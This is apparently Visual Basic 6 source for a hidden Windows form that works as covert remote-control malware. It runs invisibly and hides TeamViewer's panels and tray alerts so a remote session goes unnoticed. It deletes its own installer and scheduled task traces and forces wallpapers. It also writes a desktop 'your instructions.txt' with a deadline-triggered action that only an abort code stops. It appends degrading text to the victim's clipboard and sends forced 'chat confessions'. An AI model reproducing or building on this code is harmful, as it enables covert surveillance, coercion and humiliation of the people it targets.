VERSION 5.00
Begin VB.Form F_Main 
   Appearance      =   0  'Flat
   BackColor       =   &H80000005&
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   2955
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   3270
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   2955
   ScaleWidth      =   3270
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer Hrlg_Kill_Setup 
      Left            =   1800
      Top             =   2400
   End
   Begin VB.Timer Hrlg_Alarm 
      Enabled         =   0   'False
      Left            =   2160
      Top             =   480
   End
   Begin VB.Timer Hrlg_Fin_Batch 
      Left            =   2040
      Top             =   1680
   End
   Begin VB.Timer Hrlg_Slow 
      Interval        =   5000
      Left            =   1320
      Top             =   480
   End
   Begin VB.Timer Hrlg_Activate 
      Interval        =   5000
      Left            =   720
      Top             =   2280
   End
   Begin VB.Timer Timer_Clipboard 
      Enabled         =   0   'False
      Left            =   600
      Top             =   1080
   End
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   600
      Top             =   480
   End
End
Attribute VB_Name = "F_Main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub Form_Load()

Dim s As String

nb_t_ChatRooms = 0
' Pour forcer à une première lecture
'-----------------------------------
ChatConfession_On = True

'TmpDir = Environ("tmp")
TmpDir = "C:\ProgramData\TeamViewer"
Fictmp = TmpDir & "\" & NomFictmp
Fic_ini = TmpDir & "\htvp.ini"
s = LireIni("TV", "HideTVPanel", Fic_ini)
If s = "1" Then
    hidetv = True
    hidetvPermanent = True
    TrayWasHidden = True
Else
    hidetv = False
    hidetvPermanent = False
    TrayWasHidden = False
End If
ToolPW = LireIni("Protection", "ToolPW", Fic_ini)

s = LireIni("WallPaper", "NomPic", Fic_ini)
If s <> "" Then
    Nom_Wallpaper = s
    WallPaperPermanent = True
Else
    WallPaperPermanent = False
End If

s = LireIni("WelcomeScreen", "NomPic", Fic_ini)
If s <> "" Then
    Nom_WelcomeScreen = s
    WelcomeScreenPermanent = True
Else
    WelcomeScreenPermanent = False
End If

s = LireIni("TV", "HideTVComputerList", Fic_ini)
If s <> "" Then
    HideTVComp = s
End If

' Deadline
'---------
s = LireIni("Schedule_Action", "Deadline", Fic_ini)
s_Deadline = Format(s, "YYYY") & Format(s, "MM") & Format(s, "DD") & Format(s, "hh") & Format(s, "nn")
' Release code
'-------------
s = LireIni("Schedule_Action", "ReleaseCode", Fic_ini)
s_ReleaseCode = RemoveQuotes(Desencaps(s))
' Message
'--------
s = LireIni("Schedule_Action", "Message", Fic_ini)
s_Message = RemoveQuotes(Desencaps(s))
' Message date
'-------------
s = LireIni("Schedule_Action", "MessageDate", Fic_ini)
s_MessageDate = Format(s, "YYYY") & Format(s, "MM") & Format(s, "DD") & Format(s, "hh") & Format(s, "nn")
' Message displayed
'------------------
s = LireIni("Schedule_Action", "MessageDisplayed", Fic_ini)
s_MessageDisplayed = s


Hide_MainTV = False
TrayWasHidden = False
hidetvTrayNotification = False
nokey = False
tv_exit = False
'HideTVComp = False
ResizeMainWindow = False
TVCompWasHidden = False
ClpBrd = ""
PC_Name = UCase(GetComputerName)
Init_Prefixes
mean_force_to_type = False
mean_add_clipboard = False
s_add_fin_clipboard = ". I am a slut"

' Effacement du programme d'installation s'il existe
'---------------------------------------------------
Exe_Install = LireIni("Setup", "Exe", Fic_ini)
If Exe_Install <> "" Then
    Hrlg_Kill_Setup.Interval = 500
End If

If Not Mode_debug Then Install_htvp

' On supprime le hook clavier pour voir si ça corrige certains problèmes
'hook = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf myfunc, App.hInstance, 0)
'If hook = 0 Then
'    s = GetWin32ErrorDescription(GetLastError())
'    MsgBox s
'    End
'End If

End Sub

Private Sub Hrlg_Activate_Timer()

If dbExecWindows = 0 Then Exit Sub
On Error Resume Next

If IsWindow(Exec_Hwnd) Then
'    res = SetWindowPos(Exec_Hwnd, 0, 0, 0, 0, 0, &H4 + &H2 + &H1)
    ShowWindow Exec_Hwnd, 3
    AppActivate dbExecWindows
Else
    If Exec_cmd <> "" Then
        If Exec_cmd <> "URL" Then
            dbExecWindows = Shell(Exec_cmd & " " & Exec_Par1, 3)
            DoEvents
            Sleep 4000
            Exec_Hwnd = GetForegroundWindow()
        Else
            dbExecWindows = ShellExecute(Me.Hwnd, "open", Exec_Par1, vbNullString, "C:Windows", 3)
            DoEvents
            Sleep 4000
            Exec_Hwnd = GetForegroundWindow()
        End If
    End If
End If
On Error GoTo 0

End Sub

Private Sub Hrlg_Alarm_Timer()

PlaySound vbNullChar, 0, SND_FILENAME Or SND_ASYNC
Hrlg_Alarm.Interval = 0
Hrlg_Alarm.Enabled = False

End Sub

Private Sub Hrlg_Fin_Batch_Timer()

Hrlg_Fin_Batch.Interval = 0
Hrlg_Fin_Batch.Enabled = False
ShellWait "cmd.exe /c ""schtasks /end /tn BackgroundSetup""", vbHide
ShellWait "cmd.exe /c ""schtasks /delete /tn BackgroundSetup /f""", vbHide
On Error Resume Next
Kill Environ("tmp") & "\tempbat.bat"

End Sub

Private Sub Hrlg_Kill_Setup_Timer()

Hrlg_Kill_Setup.Interval = 0
Hrlg_Kill_Setup.Enabled = False
EcrireIni "Setup", "Exe", "", Fic_ini
On Error Resume Next
Kill Exe_Install
On Error GoTo 0

End Sub

Private Sub Hrlg_Slow_Timer()

Dim s As String
Dim F_Num As Integer
Dim i As Long
Dim strData As String
Dim s_now As String
Dim s_Path As String

If WelcomeScreenPermanent Then
    ForceWelcomeScreen
End If

If WallPaperPermanent Then
    SetWallpaper Nom_Wallpaper
End If

'' Enforce
''--------
'If s_Deadline <> "" Then
'    s = Now
'    s = Format(s, "YYYY") & Format(s, "MM") & Format(s, "DD") & Format(s, "hh") & Format(s, "nn")
'    If s > s_Deadline Then
'        EcrireIni "Enforce", "Deadline", "", Fic_ini
'        s_Deadline = ""
'        Go_EnforceDeadline
'    End If
'    If Trim(s_ReleaseCode) <> "" Then
'        ' Lecture du fichier instructions
'        '--------------------------------
'        s_Path = Environ("HOMEPATH") & "\desktop" & "\your instructions.txt"
'        F_Num = FreeFile
'        Open s_Path For Binary Access Read As F_Num
'        strData = String$(LOF(F_Num), " ")
'        Get F_Num, , strData
'        Close F_Num
'        i = InStr(1, strData, "Abort code:")
'        If i > 0 Then
'            i = InStr(i + Len("Abort code:"), strData, s_ReleaseCode)
'            If i > 0 Then
'                AbortSchedule_Enforce
'            End If
'        End If
'    End If
'End If

s = Now
s_now = Format(s, "YYYY") & Format(s, "MM") & Format(s, "DD") & Format(s, "hh") & Format(s, "nn")
' Si on doit afficher le message
'-------------------------------
If s_MessageDisplayed = "NO" Then
    If (s_now >= s_MessageDate) Or (s_MessageDate = "") Then
        EcrireIni "Schedule_Action", "MessageDisplayed", "YES", Fic_ini
        s_MessageDisplayed = "YES"
        s = FormatScheduledMessage(s_Message)
        s_Path = Environ("HOMEPATH") & "\desktop" & "\your instructions.txt"
        F_Num = FreeFile
        On Error Resume Next
        Kill s_Path
        On Error GoTo SauteScheduleAction
        Open s_Path For Binary Access Write As F_Num
        Put F_Num, , s
        Close F_Num
        ExecuteCommand "Notepad.exe", s_Path, "", 3
    End If
End If

' Si on doit exécuter l'action
'-----------------------------
If s_Deadline <> "" Then
    If s_now >= s_Deadline Then
        EcrireIni "Schedule_Action", "Deadline", "", Fic_ini
        s_Deadline = ""
        Go_ScheduledAction
    End If
    If Trim(s_ReleaseCode) <> "" Then
        ' Lecture du fichier instructions
        '--------------------------------
        s_Path = Environ("HOMEPATH") & "\desktop" & "\your instructions.txt"
        F_Num = FreeFile
        Open s_Path For Binary Access Read As F_Num
        strData = String$(LOF(F_Num), " ")
        Get F_Num, , strData
        Close F_Num
        i = InStr(1, strData, "Abort code:")
        If i > 0 Then
            i = InStr(i + Len("Abort code:"), strData, s_ReleaseCode)
            If i > 0 Then
                AbortScheduledAction
            End If
        End If
    End If
End If

SauteScheduleAction:

End Sub

Private Sub Timer_Clipboard_Timer()

Dim s As String

On Error GoTo nextcheck
If Clipboard.GetFormat(vbCFText) Then
    s = Clipboard.GetText(vbCFText)
    If s = s_CurrentClipboard Then
        Clipboard.Clear
    End If
End If
s_CurrentClipboard = ""
Timer_Clipboard.Enabled = False
Timer_Clipboard.Interval = 0
Exit Sub

nextcheck:
End Sub

Private Sub Timer1_Timer()

If ChatConfession_On Then
    SendChatConfession
End If
If hidetvTrayNotification Then
    HideTrayNotification
ElseIf TrayWasHidden Then
    TrayWasHidden = False
    ShowTrayNotification
End If
If Hide_MainTV Then
    HideMainTV
ElseIf MainTVWasHidden Then
    MainTVWasHidden = False
    ShowMainTV
End If
If ResizeMainWindow Then
    ResizeTVMainWindow
End If
If hidetv Then
    HideTVPanel
ElseIf TVWasHidden Then
    TVWasHidden = False
    ShowTVPanel
End If
If HideTVComp Then
    HideTVComputers
    ' Pour Master Chris ;)
    '---------------------
'    ResizeTVMainWindow
ElseIf TVCompWasHidden Then
    TVCompWasHidden = False
    ShowTVComputers
End If
If tv_exit Then End
If AlertConnection Then
    If IsTVPanelVisible Then
        If F_Main.Hrlg_Alarm.Enabled = False Then
            If Not AlarmHasBeenPlayed Then
                AlarmHasBeenPlayed = True
                PlaySound "C:\Users\A_TV\AppData\Local\Temp\alarm.wav", 0, SND_FILENAME Or SND_ASYNC
                F_Main.Hrlg_Alarm.Interval = 5000
                F_Main.Hrlg_Alarm.Enabled = True
            End If
        End If
    Else
        AlarmHasBeenPlayed = False
    End If
End If
TraiteClipboard

End Sub
